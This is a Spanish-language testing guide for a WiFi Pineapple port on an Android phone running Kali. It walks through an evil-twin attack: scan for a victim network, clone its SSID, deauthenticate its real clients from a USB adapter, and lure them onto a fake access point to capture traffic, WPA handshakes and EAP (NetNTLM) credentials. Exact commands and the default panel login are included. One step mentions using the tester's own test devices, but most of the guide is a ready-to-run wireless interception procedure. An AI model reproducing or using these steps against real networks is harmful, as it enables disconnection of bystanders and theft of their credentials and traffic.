# WiFi Pineapple Port — Instructivo de pruebas end-to-end (Motorola G82 / Kali)

El port YA está instalado y provisionado en el G82. Faltan las pruebas que tocan
red/WiFi (que harías vos, porque me desconectan). Seguí los pasos en orden.

## Mapa de interfaces (REPARTO evil-twin — IMPORTANTE)

La radio interna del G82 (chip WCN3990, driver ath10k_snoc) es **mono-radio /
mono-canal**: una sola frecuencia a la vez. Soporta STA+AP concurrentes **en el
MISMO canal** (`iw phy phy0 info` → `#{managed}<=2, #{AP...}<=2, #channels<=1`).
Lo que la radio interna NO puede sin tumbar la red es **modo monitor**: con el
regdom permisivo del port, el monitor transmite en el canal del router a potencia
anómala y dispara un reset de CSA/DFS en el router → **se cae toda la casa (5G+2.4G)**.

Por eso el reparto es:

- **wlan0** = WiFi INTERNO → hace DOS cosas a la vez, en su canal de uplink:
  1. **STA** conectada a tu WiFi (el internet del teléfono, que también alimenta
     a las víctimas del evil twin vía NAT).
  2. **Fake AP (evil twin / KARMA)** en el **mismo canal** que la STA. `wifi-apply`
     detecta el canal del uplink y fuerza el AP a ese canal + `hw_mode` correcto
     (a/g). Las víctimas dual-band lo encuentran por SSID aunque su AP real esté
     en otra banda.
  El recon usa `iw dev wlan0 scan` NATIVO (scan_sta), sin monitor, sin cortar
  internet. **wlan0 NUNCA se pone en monitor** (gate estructural por phy-path).
- **wlan1** = TP-Link Archer USB → queda LIBRE para lo que la interna no puede:
  **deauth multicanal al target, scan de handshakes, captura**. El monitor SOLO
  se crea sobre la Archer (adaptador USB dedicado), nunca sobre la interna.
  - El default de `pineap_interface` es `wlan1mon` → "sin Archer = sin monitor"
    por diseño; el stack arranca igual y hace recon por STA scan.
- `usb0` = tether USB de NetHunter, IP FIJA `172.16.42.1/24` (lifeline SSH). NO se toca.
- `br-lan` = bridge del Pineapple, IP `172.16.84.1`, DHCP 172.16.84.100-250 a las
  víctimas (bound EXCLUSIVO a br-lan; nunca sirve DHCP a tu LAN real).
- Panel web: `http://172.16.84.1:1471`  (login por defecto: `root` / `pineapplesareyummy`).

### Flujo evil-twin completo (cómo clonás "pepito")
1. Scan (STA, wlan0) → encontrás "pepito" (ej. canal 11, 2.4GHz).
2. Clonás el SSID en el fake AP → `pineap add_ssid pepito` (o el pool de karma).
3. El fake AP "pepito" corre en **wlan0, en TU canal de uplink** (ej. 60/5GHz).
4. Con la **Archer (wlan1)** mandás **deauth al "pepito" real** en su canal (11).
5. Los clientes de "pepito" lo pierden, **escanean todas las bandas buscando el
   SSID**, y encuentran TU "pepito" (canal 60). Se asocian → reciben DHCP
   172.16.84.x y salen a internet por NAT vía tu uplink. Capturás tráfico/creds.

### Blindaje anti-caída-de-red (por qué ya no te tumba la casa)
- `wlan0` (radio interna, bus SoC/platform) jamás entra en monitor: gate por
  **phy-path** en `pineapd-iface.sh`, en el binario `pineapd`, y en el botón
  `airmon-ng start` del panel (Networking).
- Si quedó un `wlan0mon` residual de una corrida vieja, el stack lo **destruye** y
  devuelve wlan0 a managed (no lo re-levanta).
- Al parar el stack, `ExecStopPost` (`pineapd-iface-restore.sh`) garantiza que la
  interna vuelva a managed + reconecte.

## 0. Pre-chequeo de hardware (antes de arrancar nada)
El fake AP corre en la **interna (wlan0)**, así que el stack arranca sin la Archer.
La Archer solo hace falta para **deauth/scan/captura**. Verificá:
```
sudo iw dev                       # wlan0 (interno). wlan1 aparece solo si conectás la Archer.
sudo iw phy phy0 info | grep -A6 "valid interface combinations"   # debe listar managed+AP, #channels<=1
sudo iw dev wlan0 link            # debe decir "Connected to ..." (tu uplink; define el canal del fake AP)
```
- El fake AP toma automáticamente el **canal de tu uplink** (lo resuelve `wifi-apply`).
  No lo fijes a mano salvo que sepas lo que hacés.
- Si la Archer NO enumera como `wlan1` (p.ej. `wlan2`), anotá el nombre real y ajustá
  `pineap_interface` en el panel (PineAP settings) o en `/opt/pineapple/etc/uci/pineap`
  (poné `<nombre>mon`, ej. `wlan2mon`).
- El recon NO necesita monitor (usa STA scan sobre wlan0). El monitor/deauth se hace
  a demanda SOLO sobre la Archer. **Nunca sobre wlan0** (te tumbaría la casa).
- Cero ataque automático al activar el stack: karma/deauth son a demanda.

### Fake AP en 5GHz: canales DFS vs no-DFS (IMPORTANTE)
El fake AP en la radio interna (wlan0) comparte canal con tu uplink (chip mono-canal).
En 5GHz hay dos tipos de canal:
- **NO-DFS (se puede hostear AP):** 36, 40, 44, 48 (UNII-1) y 149, 153, 157, 161, 165 (UNII-3).
- **DFS (NO se puede hostear AP en este chip):** 52–64 y 100–144. Requieren radar
  detection (CAC) que el firmware WCN3990 no soporta para beaconing; hostapd falla
  con `Could not select hw_mode and channel (-3)` / `Failed to set beacon parameters`.

Comportamiento del stack:
- Si tu uplink está en un canal **no-DFS** (2.4GHz o 5GHz 36-48/149-165) → el fake AP
  levanta en ese canal. OK.
- Si tu uplink está en un canal **DFS** (ej. 60) → el panel muestra un **pop-up en
  inglés** avisando que no se puede, y el AP no arranca (sin romper nada). Movés tu
  router a un canal no-DFS y listo.
- Si NO estás conectado a ningún WiFi → el fake AP levanta igual en 2.4GHz (canal 1),
  **sin internet** para las víctimas (sin restricción de canal).

Para ver/cambiar el canal de tu uplink: `iw dev wlan0 info | grep channel`.

### Requisito del regulatory domain (una sola vez)
El 5GHz necesita un `regulatory.db` con firma válida. Si `iw list` muestra todos los
canales 5GHz como `(no IR)` y `dmesg | grep regulatory.db` dice *"malformed or
signature invalid"*, apuntá el alternatives a la versión upstream (firma sforshee que
el kernel sí tiene) y reiniciá:
```
sudo update-alternatives --set regulatory.db /lib/firmware/regulatory.db-upstream
sudo reboot
# tras el reboot:
sudo iw reg set AR            # tu país
iw list | grep -E "5180.0|5745.0"   # 36/149 ya NO deben decir "(no IR)"
```

## 1. Arrancar el stack completo
```
sudo systemctl start pineapple.target
```
Esto levanta en orden: firstboot (ya hecho) → net (br-lan 172.16.84.1 + NAT) → dnsmasq → php-fpm → nginx → pineapd (recon via STA scan sobre wlan0, SIN monitor) → ap (hostapd-mana en wlan1, SOLO si el Archer está presente).

Chequeá que todo quedó activo:
```
systemctl status pineapple-net pineapple-dnsmasq pineapple-php-fpm \
  pineapple-nginx pineapd pineapple-ap --no-pager | grep -E "●|Active"
```
Todos deben decir `active`. Si alguno falla, pegame: `journalctl -u <unit> --no-pager | tail -30`.

## 2. Verificar la red del Pineapple
```
ip addr show br-lan                 # debe tener 172.16.84.1/24
ip addr show usb0                   # debe SEGUIR en 172.16.42.1/24 (SSH-USB intacto)
sudo nft list table inet pineapple  # reglas NAT/masquerade presentes
ps aux | grep -E "dnsmasq.*br-lan"  # dnsmasq escuchando en br-lan
```
IMPORTANTE: tu conexión normal del teléfono (datos/WiFi cliente) NO debería cortarse —
el Pineapple vive en br-lan + wlan1, separado. Si perdés internet, pará con
`sudo systemctl stop pineapple.target` y avisame.

## 3. Panel web
Desde el navegador del G82 (o una PC en la misma red): `http://172.16.84.1:1471`
- Login: `root` / `pineapplesareyummy`
- Verificá que carga el Dashboard, el menú lateral de módulos, y que no hay errores.
- Entrá a **PineAP** → settings: confirmá que las interfaces se ven bien.
Reportá: ¿carga el panel? ¿login OK? ¿se ven los módulos?

## 4. Core pineapd/pineap (sin cliente víctima todavía)
```
# el daemon ya corre (unit pineapd). Probá el CLI:
sudo pineap /tmp/pineap.conf get_status      # debe devolver JSON (scanRunning, bssid, etc)
sudo pineap /tmp/pineap.conf add_ssid PruebaNet
sudo pineap /tmp/pineap.conf list_ssids      # debe listar PruebaNet
sudo pineap /tmp/pineap.conf clear_ssids
```
Reportá la salida de `get_status` y si add/list/clear funcionan.

## 5. Recon (monitor en wlan0mon)
En el panel → **Recon** → iniciá un scan. O por CLI:
```
sudo iw dev wlan0 info | grep type   # debe decir "type managed" (NO monitor; internet intacto)
sudo pineap /tmp/pineap.conf run_scan
# esperá unos segundos (el scan corre sobre la STA wlan0, SIN cortar el internet)
sudo pineap /tmp/pineap.conf get_status   # scanRunning/scanPercent
RDB=$(grep -oP 'recon_db_path\s*=\s*\K\S+' /tmp/pineap.conf)
sqlite3 "$RDB" "SELECT ssid,bssid FROM aps LIMIT 10;"   # ¿aparecen APs cercanos?
```
Reportá: ¿detecta redes WiFi cercanas? ¿se llenan las tablas aps/clients?
NOTA: wlan0 debe seguir en "managed" y con internet. Si aparece wlan0mon o wlan0
pasó a monitor, el fix NO se aplicó — pará el stack y avisame.

## 6. Karma / Evil Twin (fake AP en wlan0 = radio interna, canal del uplink)
En el panel → **PineAP** → activá PineAP/Karma. O por CLI:
```
sudo pineap /tmp/pineap.conf karma on
# hostapd-mana levanta el fake AP en wlan0, en el MISMO canal que tu uplink.
cat /tmp/hostapd-pineapple.conf | grep -E "interface|channel|hw_mode"  # verificá iface=wlan0, canal=uplink
sudo iw dev | grep -A3 wlan0    # debe verse wlan0 como STA + un AP en el mismo canal
```
Con OTRO dispositivo (teléfono/laptop de prueba), buscá redes:
- ¿Aparece el AP del Pineapple? ¿Responde a SSIDs que tu dispositivo busca (karma)?
- Conectate al AP abierto y verificá que te da IP (172.16.84.x), que ves el tráfico,
  y que **sigue teniendo internet** (NAT por tu uplink wlan0). 
- IMPORTANTE: tu propio internet (la STA wlan0) debe seguir funcionando — STA+AP
  conviven en el mismo canal. Si se cae tu internet al levantar el AP, pará y avisame.
Reportá: ¿el AP levanta en wlan0? ¿karma responde probes? ¿un cliente asocia, recibe
DHCP y navega? ¿tu internet sigue OK?

## 7. Deauth (SIEMPRE desde la Archer wlan1 — NUNCA wlan0)
Requiere la Archer conectada y en monitor (adaptador dedicado):
```
sudo iw dev wlan1 info | grep type     # si no es monitor: sudo airmon-ng start wlan1
sudo pineap /tmp/pineap.conf deauth <BSSID_objetivo> <MAC_cliente> <canal> 5
```
- El deauth sale por la Archer en el canal del target (ej. canal 11), mientras el
  fake AP sigue en wlan0 (canal 60). El cliente deautenticado busca el SSID y cae
  en tu evil twin.
- (Usá un AP/cliente DE PRUEBA TUYO — ej. tu Razr en la 2.4G.) Reportá si desconecta.
- NUNCA pongas wlan0 en monitor para deauth: te vuelve a tumbar la casa. El panel y
  el stack ya lo bloquean, pero no lo fuerces a mano.

## 8. Handshake capture
```
# con karma/recon activo y un cliente conectándose a un AP de prueba:
ls -la /tmp/handshakes/     # deben aparecer <mac>_full.pcap / _partial.pcap
```
Reportá si captura handshakes.

## 9. PineAPe Enterprise (EAP credential harvest)
```
# generar certs (si no se generaron en firstboot):
sudo /etc/pineape/certs/configure.sh
ls -la /etc/pineape/certs/      # ca.pem, server.crt, server.key
# en el panel PineAP → Enterprise: activar
# con un cliente de prueba que intente conectar al SSID WPA2-Enterprise falso:
sqlite3 /etc/pineapple/pineape.db "SELECT * FROM chalresp; SELECT * FROM basic;"
```
Reportá si captura credenciales EAP (NetNTLM/identidades).

## 10. Parar todo (revierte la red, deja el teléfono como estaba)
```
sudo systemctl stop pineapple.target
```
Verificá que `br-lan` desaparece y tu conexión normal vuelve:
```
ip addr show br-lan   # no debe existir
sudo nft list table inet pineapple 2>&1   # "No such file" = revertido OK
```

## Desinstalar (si hace falta, revierte TODO sin tocar el OS)
```
cd /home/kali/pineapple-port && sudo sh install.sh --uninstall
# o: sudo sh uninstall.sh
```

## Qué reportarme por cada paso
Para cada prueba, decime: ✅ funciona / ❌ falla + la salida del comando o
`journalctl -u <unit> --no-pager | tail -30` del servicio que falle.
Con eso lo arreglo. Las pruebas 1-4 son software (deberían andar directo);
5-9 dependen de que tus adaptadores soporten monitor/AP/injection.
